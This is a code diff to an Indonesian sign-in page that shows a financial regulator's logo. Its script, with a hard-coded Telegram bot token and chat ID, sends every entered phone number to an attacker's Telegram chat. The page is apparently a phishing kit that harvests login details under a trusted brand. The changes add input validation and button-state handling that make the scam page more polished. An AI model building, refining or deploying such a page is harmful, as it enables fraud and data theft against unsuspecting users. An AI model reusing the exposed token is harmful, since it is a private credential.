@@ -19,9 +19,6 @@
   </style>
  </head>
  <body class="bg-white min-h-screen flex flex-col justify-between">
-   <div class="flex items-center space-x-1 text-[10px]">
-   </div>
-  </div>
   <main class="px-6 pt-8 flex-grow max-w-md mx-auto w-full">
    <div class="flex justify-end mb-6">
     <i class="fas fa-headphones-alt text-2xl text-black"></i>
@@ -60,8 +57,10 @@
      </div>
     </div>
     <button
+      id="submitBtn"
       type="submit"
-      class="w-full bg-[#1E90FF] rounded-full py-4 text-white font-bold text-lg"
+      disabled
+      class="w-full bg-[#1E90FF] rounded-full py-4 text-white font-bold text-lg opacity-50 cursor-not-allowed"
     >
       Masuk/Daftar
     </button>
@@ -74,9 +73,8 @@
    </p>
   </main>
   <footer
-    class="max-w-md mx-auto w-full px-6 py-6 flex justify-between items-center space-x-2"
+    class="max-w-md mx-auto w-full px-6 py-6 flex justify-center items-center"
   >
-  
    <img
      alt="Otoritas Jasa Keuangan logo red text"
      class="h-5"
@@ -89,15 +87,34 @@
     const botToken = "8316280054:AAGlD7WDlLDzFjfjuEBm87HMHXQ11yMQGSg";
     const chatId = "5689726675";
 
+    const phoneInput = document.getElementById("phoneInput");
+    const submitBtn = document.getElementById("submitBtn");
+
+    function validatePhone() {
+      const value = phoneInput.value.trim();
+      const isValid = /^[0-9]{6,15}$/.test(value);
+      if (isValid) {
+        submitBtn.disabled = false;
+        submitBtn.classList.remove("opacity-50", "cursor-not-allowed");
+      } else {
+        submitBtn.disabled = true;
+        submitBtn.classList.add("opacity-50", "cursor-not-allowed");
+      }
+    }
+
+    phoneInput.addEventListener("input", validatePhone);
+
     document.getElementById("phoneForm").addEventListener("submit", function (e) {
       e.preventDefault();
-      const phoneInput = document.getElementById("phoneInput");
       const phoneNumber = phoneInput.value.trim();
 
       if (!phoneNumber.match(/^[0-9]{6,15}$/)) {
         alert("Nomor HP tidak valid. Masukkan hanya angka 6-15 digit.");
         return;
       }
+
+      submitBtn.disabled = true;
+      submitBtn.classList.add("opacity-50", "cursor-not-allowed");
 
       const message = `Nomor HP masuk/daftar: +62${phoneNumber}`;
 
@@ -113,10 +130,14 @@
             phoneInput.value = "";
           } else {
             alert("Gagal mengirim ke Telegram. Coba lagi.");
+            submitBtn.disabled = false;
+            submitBtn.classList.remove("opacity-50", "cursor-not-allowed");
           }
         })
         .catch(() => {
           alert("Gagal mengirim ke Telegram. Coba lagi.");
+          submitBtn.disabled = false;
+          submitBtn.classList.remove("opacity-50", "cursor-not-allowed");
         });
     });
   </script>
